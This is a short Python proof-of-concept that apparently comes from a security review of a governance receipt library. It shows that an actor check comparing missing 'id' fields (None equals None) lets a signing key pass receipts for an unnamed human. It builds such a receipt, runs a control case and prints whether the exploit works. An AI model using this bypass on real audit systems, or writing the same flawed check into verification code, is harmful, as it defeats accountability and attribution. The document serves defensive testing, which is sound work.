#!/usr/bin/env python3
"""poc_alpha_7 — human identity wildcard via absent ids. Neither side
requires the id field to EXIST:

  * verify_receipt's structural checks never require actor.id (L3 checks
    type/is_service_account/auth_method/human_principal only);
  * the registry check is `entry.get("id") != actor.get("id")` — if the
    registry entry omits "id" (malformed/partial registry row) AND the
    receipt omits actor.id, None == None and the binding is vacuously
    satisfied.

Result: with one sloppy registry entry {"type": "human"}, the key becomes a
wildcard that PASSes receipts for an UNNAMED human principal — Art.12(3)(d)
attribution satisfied in form, void in substance.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         keyid, sha256_hex)

POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk, pk = generate_keypair()
kid = keyid(pk)

# Sloppy registry row: type but no id.
registry = {kid: {"type": "human"}}

# Anonymous human actor: every L3 field present, but no id.
anon = {"type": "human", "is_service_account": False,
        "auth_method": "hardware_key", "human_principal": "Mallory"}
r = build_receipt(action_id="a-777", subject_name="prod:svc", actor=anon,
                  policy_decision=POL,
                  execution={"side_effect_class": "WRITE_IRREVERSIBLE", "status": "EXECUTED"},
                  evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

v = verify_receipt(r, pk, authorized_actors=registry)
print(f"[*] registry entry: {registry[kid]}  (no id)")
print(f"[*] receipt actor:  {anon}  (no id)")
print(f"[*] verdict={v.verdict}  reasons={v.reasons}")

# Control: a registry row WITH an id correctly rejects the anonymous claim.
registry_strict = {kid: {"type": "human", "id": "s.lutar"}}
v2 = verify_receipt(r, pk, authorized_actors=registry_strict)
print(f"[*] control (registry row with id): verdict={v2.verdict} — rejected: {v2.verdict == 'FAIL'}")

works = v.verdict == "PASS" and v2.verdict == "FAIL"
print("EXPLOIT-WORKS" if works else "HELD")
